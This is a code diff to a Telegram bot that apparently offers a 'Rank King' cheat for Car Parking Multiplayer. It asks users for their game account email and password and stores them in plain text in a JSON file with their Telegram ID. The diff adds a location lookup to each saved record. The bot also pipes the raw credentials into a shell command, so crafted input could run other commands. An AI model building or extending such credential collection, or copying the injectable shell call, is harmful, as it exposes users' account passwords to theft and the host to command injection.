@@ -3,6 +3,7 @@ import subprocess
 import time
 import json
 import os
+import requests
 from datetime import date
 from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
 
@@ -39,14 +40,31 @@ def increase_usage(uid):
         daily_usage[uid] = {"date": today, "count": 0}
     daily_usage[uid]["count"] += 1
 
+# ================= AUTO LOKASI IP =================
+def get_location_ip():
+    try:
+        r = requests.get("https://ipinfo.io/json", timeout=5).json()
+        city = r.get("city", "")
+        region = r.get("region", "")
+        country = r.get("country", "")
+        location = ", ".join(x for x in [city, region, country] if x)
+        return location if location else "Unknown"
+    except:
+        return "Unknown"
+
 # ================= SAVE LOGIN =================
 def save_login(email, password, tool, uid):
+    location = get_location_ip()
+
     data = {
-        "email": email,
-        "password": password,
-        "tool": tool,
-        "telegram_id": uid,
-        "time": time.strftime("%Y-%m-%d %H:%M:%S")
+
+ "email": email,
+ "password": password,
+ "tool": tool,
+ "telegram_id": uid,
+ "location": location,
+ "time": time.strftime("%Y-%m-%d %H:%M:%S")
+
     }
 
     filename = "profile_login.json"
@@ -132,7 +150,7 @@ def callback(call):
                 call.message.chat.id,
                 "⛔ *LIMIT FREE TERCAPAI*\n\n"
                 "FREE hanya 1x / hari.\n"
-                "Upgrade PREMIUM untuk akses fitur premium di @AWIMEDAN0.",
+                "Upgrade PREMIUM untuk akses fitur premium di @AWIMEDAN0",
                 parse_mode="Markdown"
             )
             return
@@ -188,7 +206,6 @@ def login_flow(message):
         password = text
         tool = sess["tool"]
 
-        # SIMPAN LOGIN
         save_login(email, password, tool, uid)
 
         del sessions[uid]
@@ -196,7 +213,7 @@ def login_flow(message):
         if not is_premium(uid):
             increase_usage(uid)
 
-        bot.send_message(message.chat.id, "⏳️Inject Rank King, mohon tunggu...")
+        bot.send_message(message.chat.id, "🔥 Inject Rank King, mohon tunggu...")
 
         script = "cpm1.py" if tool == "cpm1" else "cpm2.py"
         cmd = f'printf "{email}\\n{password}\\n" | python {script}'
@@ -216,5 +233,5 @@ def login_flow(message):
             bot.send_message(message.chat.id, result)
 
 # ================= RUN =================
-print("🤖 Rank King CPM Bot | OPEN PUBLIK | ONLINE")
+print("🤖 Rank King CPM Bot | OPEN PUBLIK | AUTO IP LOCATION | ONLINE")
 bot.infinity_polling()
